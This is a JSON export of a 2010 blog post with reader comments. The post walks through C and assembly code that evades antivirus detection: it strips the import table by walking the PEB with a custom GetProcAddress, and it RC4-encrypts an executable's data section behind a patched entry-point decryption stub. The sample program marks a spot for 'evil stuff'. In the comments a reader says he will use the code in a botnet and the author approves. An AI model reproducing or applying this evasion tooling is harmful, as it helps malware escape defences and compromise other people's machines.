@@ -1,0 +1,252 @@
+{
+  "id": 212,
+  "slug": "clever-tricks-against-antiviruses",
+  "title": "Clever tricks against antiviruses",
+  "publishedAt": "2010-04-18T22:57:14Z",
+  "localDate": "2010-04-19 00:57:14",
+  "updatedAt": "2012-03-11T03:46:03Z",
+  "author": "X-N2O",
+  "categories": [
+    {
+      "name": "Programming",
+      "slug": "programming"
+    },
+    {
+      "name": "Cryptography",
+      "slug": "cryptography"
+    }
+  ],
+  "tags": [
+    {
+      "name": "Anti-Virus",
+      "slug": "anti-virus"
+    },
+    {
+      "name": "Block Cipher",
+      "slug": "block-cipher"
+    },
+    {
+      "name": "data section encryption",
+      "slug": "data-section-encryption"
+    },
+    {
+      "name": "DLL",
+      "slug": "dll"
+    },
+    {
+      "name": "dynamic API loading",
+      "slug": "dynamic-api-loading"
+    },
+    {
+      "name": "getprocaddress",
+      "slug": "getprocaddress"
+    },
+    {
+      "name": "loadlibrary",
+      "slug": "loadlibrary"
+    },
+    {
+      "name": "no imports",
+      "slug": "no-imports"
+    },
+    {
+      "name": "PE",
+      "slug": "pe"
+    }
+  ],
+  "originalContent": "I bet you have come across some software you've made which you didn't want the AV to pick up. This article explains how to import from DLLs without having to call GetProcAddress, and also how to encrypt your data section. Anti-viruses rely heavily on their heuristics, if all other (signature) scans fail. The patterns they search for in your executable, are the functions being imported, and the order they are being called. <!--more-->\r\n<h3>No imports!</h3>\r\nHaving no import table is relatively easy. There are however some functions I haven't imported dynamically, but which are very normal in any application (libc functions).\r\nThe steps you need to do are:\r\n<ol>\r\n\t<li>Get the kernel32 module base address. (kernel32.dll is always loaded when the process is started, and so is ntdll.dll)</li>\r\n\t<li>Make your own GetProcAddress</li>\r\n\t<li>Use it to find LoadLibrary's address, so that you can load other DLLs</li>\r\n\t<li>Make the functions usable in a practical way, so that you don't have to make a prototype for each of the functions that you will load</li>\r\n</ol>\r\n<h4>1. Get kernel32's base address</h4>\r\nThe first step is easy. There are lots of methods out there to retrieve the kernel32 base address, whose list of supported platforms varies greatly. I will be retrieving the address using the PEB (the linked list of the modules' initialization order). Code:\r\n\r\n<pre class=\"brush:c\">void __declspec(naked) *kernel_addr() {\r\n\t// Get kernel32 base address through PEB (initialization order)\r\n\t__asm {\r\n\t\tmov eax, fs:[0x30]   // PEB address\r\n\t\tmov eax, [eax+0x0c]  // PEB->Ldr\r\n\t\tmov eax, [eax+0x1c]  // Ldr.InInitializationOrderModuleList (ntdll)\r\n\t\tmov eax, [eax]       // [ntdll].Flink (kernel32)\r\n\t\tmov eax, [eax+0x08]  // kernel32 base address\r\n\t\tret\r\n\t}\r\n}</pre>\r\n\r\nYou can use whichever method you want, really, as long as the end result is the kernel32 base address.\r\n<h4>2. Our own GetProcAddress</h4>\r\nIf you have ever had to deal with the PE format, you'd know that the exports have three main structures. These are the address table, the name table, and the ordinal table. The address table is simply just an array with RVAs to functions. There is one entry for every function exported. To get the real address, you add that RVA to the base address of the module.\r\nThe name table, is another array with RVA's to the names of the functions. The names are just strings of characters terminated by a null byte.\r\nThe problem is, the names' index doesn't always correspond to the functions' index. To retrieve the index, you use the ordinal table. The ordinal table is basically just an array with an index to the corresponding function. For example EAT[0] might be the function with the name ENT[42]. In this case, EOT[42] has the value of 0. So, the ordinal table is just another table, which maps a name to a function, using the name's index to retrieve the function's index.\r\nCode:\r\n<pre class=\"brush:c\">void *my_gpa(HMODULE modl, char *fname) {\r\n\tunsigned long modb          = (unsigned long)modl;\r\n\tIMAGE_DOS_HEADER *dosh      = (IMAGE_DOS_HEADER *)modb;\r\n\tIMAGE_NT_HEADERS *nth       = (IMAGE_NT_HEADERS *)(modb+dosh->e_lfanew);\r\n\tIMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(modb+nth->OptionalHeader.DataDirectory->VirtualAddress);\r\n\tunsigned int i;\r\n\r\n\tfor(i = 0; i < ied->NumberOfNames; i++) {\r\n\t\tconst char *nn = (*(const char **)(ied->AddressOfNames+modb+i*sizeof(void *)))+modb;\r\n\r\n\t\tif(!strcmp(fname, nn)) {\r\n\t\t\tunsigned short ordinal = *(unsigned short *)(ied->AddressOfNameOrdinals+modb+i*sizeof(unsigned short));\r\n\t\t\treturn (void *)((unsigned long)*(void **)(ied->AddressOfFunctions+modb+ordinal*sizeof(void *))+modb);\r\n\t\t}\r\n\t}\r\n\r\n\treturn NULL;\r\n}</pre>\r\n\r\nIn our code, modb is the base address of the module. Using that, we make our way to the export directory (ied), which contains the RVAs to the three tables we need. They are ied-&gt;AddressOfNames, ied-&gt;AddressOfFunctions and ied-&gt;AddressOfNameOrdinals. There's some pointer arithmetic going on there, along with some type casting. Our function works just like GetProcAddress. It takes a module base address, and a function name, and returns a function address. We iterate through each entry in the name table.\r\nThe string is retrieved through nn. (RVA of the table + base address + i*4)+base address - each entry in the table has the size of a word (32 bits = 4 bytes), so to get to the i'th entry, we add i*4. Once we've gotten to the i'th entry and dereferenced it, we add the base address to get the string's address. If the name's are the same, get the ordinal, the same way (except that one ordinal is the size of a short, 16 bits = 2 bytes). Then using the ordinal as an index, retrieve the address of the function and return it.\r\n<h4>3. Getting LoadLibrary's address</h4>\r\nEasiest step. The code speaks for itself:\r\n\r\n<pre class=\"brush:c\">HMODULE (__stdcall *dyn_ll)(LPCTSTR lpFileName);\r\ndyn_ll = my_gpa(kern, \"LoadLibraryA\");\r\n</pre>\r\n<h4>4. Making it usable</h4>\r\nYou will probably want to load lots of functions, not just one or two. Writing the prototypes for all of them would be tedious. Let's make an array of functions for each module we will load, then let's also make a function to load the APIs into these arrays. I have used kernel32, user32, and winsock. Code:\r\n\r\n<pre class=\"brush:c\">\r\n// don't forget to specify the correct calling convention\r\n\r\nchar *fn_kernel[] = {\r\n\t\"GetEnvironmentVariableA\", // 0\r\n\t\"GetModuleFileNameA\",      // 1\r\n\t\"GetTickCount\",            // 2\r\n\t\"GetLocalTime\",            // 3\r\n\t\"CreateThread\",            // 4\r\n\t\"SetThreadPriority\",       // 5\r\n};\r\nunsigned long (__stdcall *func_kernel[sizeof(fn_kernel)/sizeof(*fn_kernel)])();\r\n\r\nchar *fn_user[] = {\r\n\t\"MessageBoxA\",         // 0\r\n\t\"GetForegroundWindow\", // 1\r\n\t\"GetWindowTextA\",      // 2\r\n};\r\nunsigned long (__stdcall *func_user[sizeof(fn_user)/sizeof(*fn_user)])();\r\n\r\nchar *fn_wsock[] = {\r\n\t\"WSAStartup\",    // 0\r\n\t\"send\",          // 1\r\n\t\"connect\",       // 2\r\n\t\"socket\",        // 3\r\n\t\"gethostbyname\", // 4\r\n\t\"closesocket\",   // 5\r\n\t\"recv\",          // 6\r\n\t\"WSACleanup\",    // 7\r\n};\r\nunsigned long (WSAAPI *func_wsock[sizeof(fn_wsock)/sizeof(*fn_wsock)])();\r\n\r\nHMODULE (__stdcall *dyn_ll)(LPCTSTR lpFileName);\r\n\r\nvoid *my_gpa(HMODULE modl, char *fname) {\r\n\tunsigned long modb          = (unsigned long)modl;\r\n\tIMAGE_DOS_HEADER *dosh      = (IMAGE_DOS_HEADER *)modb;\r\n\tIMAGE_NT_HEADERS *nth       = (IMAGE_NT_HEADERS *)(modb+dosh->e_lfanew);\r\n\tIMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(modb+nth->OptionalHeader.DataDirectory->VirtualAddress);\r\n\tunsigned int i;\r\n\r\n\tfor(i = 0; i < ied->NumberOfNames; i++) {\r\n\t\tconst char *nn = (*(const char **)(ied->AddressOfNames+modb+i*sizeof(unsigned long)))+modb;\r\n\r\n\t\tif(!strcmp(fname, nn)) {\r\n\t\t\tunsigned short ordinal = *(unsigned short *)(ied->AddressOfNameOrdinals+modb+i*sizeof(unsigned short));\r\n\t\t\treturn (void *)((unsigned long)*(void **)(ied->AddressOfFunctions+modb+ordinal*sizeof(unsigned long))+modb);\r\n\t\t}\r\n\t}\r\n\r\n\treturn NULL;\r\n}\r\n\r\nvoid load_imports() {\r\n\tHMODULE kern, user, wsock;\r\n\tunsigned long i;\r\n\r\n\tkern   = kernel_addr();\r\n\tdyn_ll = my_gpa(kern, \"LoadLibraryA\");\r\n\tuser   = dyn_ll(\"user32.dll\");\r\n\twsock  = dyn_ll(\"ws2_32.dll\");\r\n\r\n\tfor(i = 0; i < sizeof(fn_kernel)/sizeof(*fn_kernel); i++)\r\n\t\tfunc_kernel[i] = my_gpa(kern, fn_kernel[i]);\r\n\r\n\tfor(i = 0; i < sizeof(fn_user)/sizeof(*fn_user); i++)\r\n\t\tfunc_user[i] = my_gpa(user, fn_user[i]);\r\n\r\n\tfor(i = 0; i < sizeof(fn_wsock)/sizeof(*fn_wsock); i++)\r\n\t\tfunc_wsock[i] = my_gpa(wsock, fn_wsock[i]);\r\n}\r\n\r\nint main(int argc, char *argv[]) {\r\n\tWSADATA wsd;\r\n\r\n\tload_imports();\r\n\t// MessageBoxA\r\n\tfunc_user[0](0, \"MessageBoxA has been called!\", \"0wn3d.\", MB_OK);\r\n\tfunc_wsock[0](MAKEWORD(1, 0), &wsd); // WSAStartup\r\n\t// evil stuff here\r\n\tfunc_wsock[7]();                     // WSACleanup\r\n\treturn EXIT_SUCCESS;\r\n}\r\n</pre>\r\n\r\nSimple. :)\r\n<h3>Encrypting your data section</h3>\r\nThis method is really easy, and of course it's not nearly as good as the average packer, but it keeps AVs away from your strings.\r\nI have used the rc4 cipher, but any symmetric stream cipher would do. We need to encrypt it from another separate program, and have our program decrypt itself. Code for the encryption program:\r\n\r\n[code lang=\"c\"]#include &lt;windows.h&gt;\r\n#include &lt;imagehlp.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;stdio.h&gt;\r\n\r\n#define DATA &quot;.data&quot;    // data section's name\r\n#define KEY  &quot;DqHAI5VN&quot; // encryption key\r\n#define NEW  0x11c8     // new ep rva\r\n#define REP  0x5e4      // offset to patch with the old ep\r\n\r\nvoid rc4_ksched(unsigned char *key, unsigned long keylen, unsigned char sbox[0x100]) {\r\n\tunsigned long i, j;\r\n\r\n\tfor(i = 0; i &lt; 0x100; i++)\r\n\t\tsbox[i] = (unsigned char)i;\r\n\r\n\tfor(j = i = 0; i &lt; 0x100; i++) {\r\n\t\tunsigned char tmp;\r\n\r\n\t\tj = (j + sbox[i] + key[i % keylen]) &amp; 0xff;\r\n\t\ttmp     = sbox[i];\r\n\t\tsbox[i] = sbox[j];\r\n\t\tsbox[j] = tmp;\r\n\t}\r\n}\r\n\r\nvoid rc4(unsigned char sbox[0x100], unsigned char *src, unsigned char *dest, unsigned long len) {\r\n\tunsigned long i, j;\r\n\r\n\ti = j = 0;\r\n\twhile(len--) {\r\n\t\tunsigned char tmp;\r\n\r\n\t\ti = (i + 1) &amp; 0xff;\r\n\t\tj = (j + sbox[i]) &amp; 0xff;\r\n\r\n\t\ttmp     = sbox[i];\r\n\t\tsbox[i] = sbox[j];\r\n\t\tsbox[j] = tmp;\r\n\r\n\t\t*dest++ = *src++ ^ sbox[(sbox[i] + sbox[j]) % 0xff];\r\n\t}\r\n}\r\n\r\nint main(int argc, char *argv) {\r\n\tFILE *f = fopen(&quot;evil.exe&quot;, &quot;r+b&quot;);\r\n\tIMAGE_DOS_HEADER dosh;\r\n\tIMAGE_NT_HEADERS nth;\r\n\tIMAGE_SECTION_HEADER sech, dummy;\r\n\r\n\tif(!f) return 1;\r\n\tmemset(&amp;dummy, 0, sizeof(dummy));\r\n\tfread(&amp;dosh, 1, sizeof(dosh), f);\r\n\tfseek(f, dosh.e_lfanew, SEEK_SET);\r\n\tfread(&amp;nth, 1, sizeof(nth), f);\r\n\tfread(&amp;sech, 1, sizeof(sech), f);\r\n\twhile(memcmp(&amp;sech, &amp;dummy, sizeof(dummy))) {\r\n\t\tif(!strcmp(sech.Name, DATA)) {\r\n\t\t\tunsigned char sbox[0x100], *rd = malloc(sech.SizeOfRawData);\r\n\t\t\tDWORD ep, epaddr;\r\n\r\n\t\t\trc4_ksched(KEY, 8, sbox);\r\n\t\t\tfseek(f, sech.PointerToRawData, SEEK_SET);\r\n\t\t\tfread(rd, 1, sech.SizeOfRawData, f);\r\n\t\t\trc4(sbox, rd, rd, sech.SizeOfRawData);\r\n\t\t\tfseek(f, sech.PointerToRawData, SEEK_SET);\r\n\t\t\tfwrite(rd, 1, sech.SizeOfRawData, f);\r\n\t\t\tfree(rd);\r\n\t\t\tepaddr = ((unsigned long)&amp;nth.OptionalHeader.AddressOfEntryPoint-(unsigned long)&amp;nth)+dosh.e_lfanew;\r\n\t\t\tfseek(f, epaddr, SEEK_SET);\r\n\t\t\tep = NEW;\r\n\t\t\tfwrite(&amp;ep, 1, 4, f);\r\n\t\t\tfseek(f, REP, SEEK_SET);\r\n\t\t\tep = nth.OptionalHeader.AddressOfEntryPoint+nth.OptionalHeader.ImageBase;\r\n\t\t\tfwrite(&amp;ep, 1, 4, f);\r\n\t\t\tfclose(f);\r\n\t\t\treturn EXIT_SUCCESS;\r\n\t\t}\r\n\t\tfread(&amp;sech, 1, sizeof(sech), f);\r\n\t}\r\n\r\n\tfclose(f);\r\n\treturn EXIT_FAILURE;\r\n}[/code]\r\n\r\nWhat it does is that it searches for the data section, and when found, it reads it into memory, encrypts it, and writes it back.\r\nBut to be able to decrypt it we must have some piece of code in our own executable, which will decrypt the data section using our key, and then jump back to the old entry point. Code:\r\n\r\n<pre class=\"brush:c\">\r\nvoid decrypt_data(unsigned long mod) {\r\n\tchar data[6];\r\n\tIMAGE_DOS_HEADER *dosh      = (IMAGE_DOS_HEADER *)mod;\r\n\tIMAGE_SECTION_HEADER *sech  = (IMAGE_SECTION_HEADER *)(mod+dosh->e_lfanew+sizeof(IMAGE_NT_HEADERS));\r\n\tIMAGE_SECTION_HEADER dummy;\r\n\r\n\tdata[0] = '.';\r\n\tdata[1] = 'd';\r\n\tdata[2] = 'a';\r\n\tdata[3] = 't';\r\n\tdata[4] = 'a';\r\n\tdata[5] = 0;\r\n\tmemset(&dummy, 0, sizeof(dummy));\r\n\twhile(memcmp(sech, &dummy, sizeof(dummy))) {\r\n\t\tif(!strcmp(sech->Name, data)) {\r\n\t\t\tunsigned char sbox[0x100], key[9];\r\n\r\n\t\t\tkey[0] = 'D';\r\n\t\t\tkey[1] = 'q';\r\n\t\t\tkey[2] = 'H';\r\n\t\t\tkey[3] = 'A';\r\n\t\t\tkey[4] = 'I';\r\n\t\t\tkey[5] = '5';\r\n\t\t\tkey[6] = 'V';\r\n\t\t\tkey[7] = 'N';\r\n\t\t\tkey[8] = 0;\r\n\t\t\trc4_ksched(key, 8, sbox);\r\n\t\t\trc4(sbox, (unsigned char *)mod+sech->VirtualAddress, (unsigned char *)mod+sech->VirtualAddress, sech->SizeOfRawData);\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tsech++;\r\n\t}\r\n\r\n\texit(EXIT_FAILURE);\r\n}\r\n\r\nvoid __declspec(naked) *gba() {\r\n\t__asm {\r\n\t\tmov eax, fs:[0x30]   // PEB address\r\n\t\tmov eax, [eax+0x08]  // PEB->BaseAddress\r\n\t\tret\r\n\t}\r\n}\r\n\r\nvoid __declspec(naked) new_ep() {\r\n\tif(*(unsigned long *)magic != 'x86!')\r\n\t\tdecrypt_data((unsigned long)gba());\r\n\t__asm {\r\n\t\tpush 0x41414141 // placeholder\r\n\t\tret\r\n\t}\r\n}\r\n</pre>\r\n\r\nAnd in main:\r\n\r\n<pre class=\"brush:c\">unsigned long nep_addr;\r\n\r\nint main(int argc, char *argv[]) {\r\n\tWSADATA wsd;\r\n\r\n\tnep_addr = (unsigned long)&new_ep;\r\n\tload_imports();\r\n\t// MessageBoxA\r\n\tfunc_user[0](0, \"MessageBoxA has been called!\", \"0wn3d.\", MB_OK);\r\n\tfunc_wsock[0](MAKEWORD(1, 0), &wsd); // WSAStartup\r\n\t// evil stuff here\r\n\tfunc_wsock[7]();                     // WSACleanup\r\n\treturn EXIT_SUCCESS;\r\n}</pre>\r\n\r\nWe reference new_ep, because otherwise the optimizing compiler would notice that it is not called anywhere and would not generate code for it.\r\n\r\nHere you will have to get some offsets. First compile the executable, and disassemble it. Find the RVA of new_ep, and put it in the encryption program source code. Then find the <b>offset</b> of the placeholder for the old entry point. The instruction will look like push 0x41414141. Add one to the address of that instruction, subtract the image base from it, subtract the RVA of the .text section from it, add the offset of the .text section to it, and there you have your offset. Now put it in the encryption source, compile it, run it, and everything is ready :)\r\n\r\nWell, that was everything.\r\nIf you found this article helpful or have a question, feel free to post a comment.",
+  "comments": [
+    {
+      "id": 23,
+      "parent": 0,
+      "author": "Alex",
+      "publishedAt": "2010-04-19T12:18:54Z",
+      "localDate": "2010-04-19 14:18:54",
+      "content": "Nice article, I love it.\nIf you want to take the next step, you could add an encryption routine to the exec, so if a copy is made, it can use a new key, so no two encryptions are the same!"
+    },
+    {
+      "id": 25,
+      "parent": 0,
+      "author": "Axel",
+      "publishedAt": "2010-04-19T13:56:22Z",
+      "localDate": "2010-04-19 15:56:22",
+      "content": "Cool, but segfaults on win7 x64 after finding some modules. No time to debug );"
+    },
+    {
+      "id": 26,
+      "parent": 0,
+      "author": "X-N2O",
+      "publishedAt": "2010-04-19T14:38:12Z",
+      "localDate": "2010-04-19 16:38:12",
+      "content": "Probably differences in the PE format, I'll check it out some time."
+    },
+    {
+      "id": 27,
+      "parent": 0,
+      "author": "Mario Vilas",
+      "publishedAt": "2010-04-20T16:34:34Z",
+      "localDate": "2010-04-20 18:34:34",
+      "content": "May be a problem with the code to find the kernel32 base and replace GetProcAddress. It's a common shellcoding trick and many shellcodes broke in Windows 7 for that reason."
+    },
+    {
+      "id": 28,
+      "parent": 0,
+      "author": "Mario Vilas",
+      "publishedAt": "2010-04-20T16:39:26Z",
+      "localDate": "2010-04-20 18:39:26",
+      "content": "Never mind, I hadn't noticed the problem was reported in x64. The inline assembly code shown here is for 32 bit platforms only.\n\nAlso the PE format changes in 64 bit platforms (DWORDs converted to QWORDs here and there). http://msdn.microsoft.com/en-us/magazine/cc301805.aspx"
+    },
+    {
+      "id": 29,
+      "parent": 0,
+      "author": "whocares",
+      "publishedAt": "2010-04-20T17:06:51Z",
+      "localDate": "2010-04-20 19:06:51",
+      "content": "also many malwares currently avoid to use function names in clear, they just hashes, pretty much the same technique used in shellcoding even if for different reasons :&gt;"
+    },
+    {
+      "id": 30,
+      "parent": 0,
+      "author": "Snake",
+      "publishedAt": "2010-04-21T06:35:19Z",
+      "localDate": "2010-04-21 08:35:19",
+      "content": "Tnx X-N2O ! \nvery useful for me , cuz I'm newbie in this kind of stuffs.."
+    },
+    {
+      "id": 31,
+      "parent": 0,
+      "author": "illustion",
+      "publishedAt": "2010-04-21T18:20:55Z",
+      "localDate": "2010-04-21 20:20:55",
+      "content": "nice artical X-N20,but there is one thing though that there some apis that only export by ordinal not by name,thus not having a name."
+    },
+    {
+      "id": 32,
+      "parent": 0,
+      "author": "X-N2O",
+      "publishedAt": "2010-04-22T12:05:32Z",
+      "localDate": "2010-04-22 14:05:32",
+      "content": "Sure there are, but you can easily modify my_gpa to retrieve functions by ordinal."
+    },
+    {
+      "id": 33,
+      "parent": 0,
+      "author": "nasgeneration",
+      "publishedAt": "2010-04-24T17:29:46Z",
+      "localDate": "2010-04-24 19:29:46",
+      "content": "Bigg thanks , its help me alot"
+    },
+    {
+      "id": 34,
+      "parent": 0,
+      "author": "Ducky",
+      "publishedAt": "2010-05-10T19:41:21Z",
+      "localDate": "2010-05-10 21:41:21",
+      "content": "Awesome! Thanks for sharing!"
+    },
+    {
+      "id": 35,
+      "parent": 0,
+      "author": "nofrillz",
+      "publishedAt": "2010-05-21T00:57:51Z",
+      "localDate": "2010-05-21 02:57:51",
+      "content": "sexy gary"
+    },
+    {
+      "id": 36,
+      "parent": 0,
+      "author": "shebaw",
+      "publishedAt": "2010-06-09T13:20:45Z",
+      "localDate": "2010-06-09 15:20:45",
+      "content": "Awesome article, I'm going to join rohitab since almost all of you veteran programmers turned out to be great coders (unlike most \"coding\" sites, where the coders are script kidies)."
+    },
+    {
+      "id": 37,
+      "parent": 0,
+      "author": "axlyb",
+      "publishedAt": "2010-08-12T14:39:51Z",
+      "localDate": "2010-08-12 16:39:51",
+      "content": "greate article,thanks for you share your knowlages"
+    },
+    {
+      "id": 38,
+      "parent": 0,
+      "author": "Chaz",
+      "publishedAt": "2011-01-07T22:29:25Z",
+      "localDate": "2011-01-07 23:29:25",
+      "content": "Love your blog. Wish it was updated more frequently."
+    },
+    {
+      "id": 39,
+      "parent": 0,
+      "author": "shebaw",
+      "publishedAt": "2011-03-29T15:15:14Z",
+      "localDate": "2011-03-29 17:15:14",
+      "content": "The shell code for finding PEB doesn't work on Windows 7.\nCheckout http://my.opera.com/wolfcod/blog/windows-7-retriev-kernel32-base-address\nfor work around"
+    },
+    {
+      "id": 42,
+      "parent": 0,
+      "author": "Ducky",
+      "publishedAt": "2011-05-01T16:47:18Z",
+      "localDate": "2011-05-01 18:47:18",
+      "content": "Never mind, i compiled it as c++."
+    },
+    {
+      "id": 43,
+      "parent": 0,
+      "author": "Mẹo nhỏ qua mặt antivirus | asmreverse",
+      "publishedAt": "2011-06-01T13:22:47Z",
+      "localDate": "2011-06-01 15:22:47",
+      "content": "[...] quangthiennguyen tham khảo từ http://www.x-n2o.com/clever-tricks-against-antiviruses/ GetIP source:  [...] "
+    },
+    {
+      "id": 371,
+      "parent": 0,
+      "author": "Hav0c",
+      "publishedAt": "2011-07-17T00:18:33Z",
+      "localDate": "2011-07-17 00:18:33",
+      "content": "hey X-N2O, i'll be using a modification of the code in this guide on my botnet\nhope you don't mind :p\n\nalso, i'm using mingw32, which uses AT&amp;T syntax for inline assembler, and it sucks balls, so a tip to anyone using mingw32, i used nasm to compile an object file (.obj), and linked it to the rest of the C code.\n\nAnd finally, X-N2O, you should put online a guide on how to encrypt the .text section, not just the .data :p. Also, im sure that there is a way to encrypt the data in memory using offsets instead of poking around with those damn pe headers."
+    },
+    {
+      "id": 382,
+      "parent": 0,
+      "author": "X-N2O",
+      "publishedAt": "2011-07-18T12:46:25Z",
+      "localDate": "2011-07-18 12:46:25",
+      "content": "You're most welcome to use it Hav0c.\nEncrypting .text isn't that hard, and it's done similarly to this method. Making a metamorphic engine would be way more challenging :)"
+    },
+    {
+      "id": 399,
+      "parent": 0,
+      "author": "Hav0c",
+      "publishedAt": "2011-07-19T23:01:08Z",
+      "localDate": "2011-07-19 23:01:08",
+      "content": "heh, yeah, but metamorphisme is way to much of a pain in the ass. I would start-off with simple polymorphisme, and than update it if the need arise. :)\n\nBtw, i dont really undersand, in the .data encryption code, could you specify the macros NEW and REP? i know they're offsets, but what i don't know is what they're for, or to what i should change them to for other executables (sorry if this sounds noobish, messing with PE structs aren't an habit for me, and as such i don't quite get most of that code). Btw, at VXChaos, there's a pdf on \"how to build your own PE protector\" or something alike, can't really recall on what section it is though. But then again, that pdf's for .text, not really .data, and even less .bss\n\nOn a last note, please make more of these guides, as i enjoy reading them, and also, i changed the gpa() function to only search for hashes rather than name (CRC32, a technique which i belive was created by some vx'er to save some space on one of his viruses), which i belive was what 'whocares' said on his post. Anyway, i can borrow you the source (not just the CRC32 functions, i really mean the whole thing) if you're interested. And if you are, you know how to contact me :)\n\ntl;dr: more info on NEW and REP macros, and more guides. that is all"
+    },
+    {
+      "id": 410,
+      "parent": 0,
+      "author": "X-N2O",
+      "publishedAt": "2011-07-20T14:05:31Z",
+      "localDate": "2011-07-20 14:05:31",
+      "content": "In order to decrypt the .data what you need is a decryption stub. The decryption stub is already there, but it needs to be called before the original entry point. This decryption stub is new_ep. We need to change the EP of the executable to the RVA of new_ep. That's what the NEW constant is. Next, after new_ep is done with decrypting, it should call/jump to the original EP. Hence we need to patch the placeholder (0x41414141) with the original EP VA. The REP constant contains the offset of the placeholder in the executable file."
+    },
+    {
+      "id": 422,
+      "parent": 0,
+      "author": "Hav0c",
+      "publishedAt": "2011-07-21T18:19:28Z",
+      "localDate": "2011-07-21 18:19:28",
+      "content": "I see, thanks for clearing things out :p"
+    },
+    {
+      "id": 5953,
+      "parent": 0,
+      "author": "minijak",
+      "publishedAt": "2012-12-05T01:48:18Z",
+      "localDate": "2012-12-05 02:48:18",
+      "content": "Hi; Can someone help me to write kernel_addr function to work and compile with gcc ?\r\nThis is my initial work, but didn't work.\r\n\r\nvoid *kernel_addr()\r\n{\r\n    HMODULE res=0;\r\n    asm(\".intel_syntax noprefix\\n\");\r\n    asm(\"mov eax, fs:[0x30]\\n\");\r\n    asm(\"mov eax, [eax+0x0c]\\n\");\r\n    asm(\"mov eax, [eax+0x1c]\\n\");\r\n    asm(\"mov eax, [eax]\\n\");\r\n    asm(\"mov eax, [eax+0x08]\\n\");\r\n    asm(\"mov %0, eax\\n\");    \r\n    asm(\".att_syntax noprefix\\n\"\r\n        : \"=r\"(res)\r\n        );\r\n    return res;\r\n}\r\n\r\nRegards"
+    }
+  ]
+}
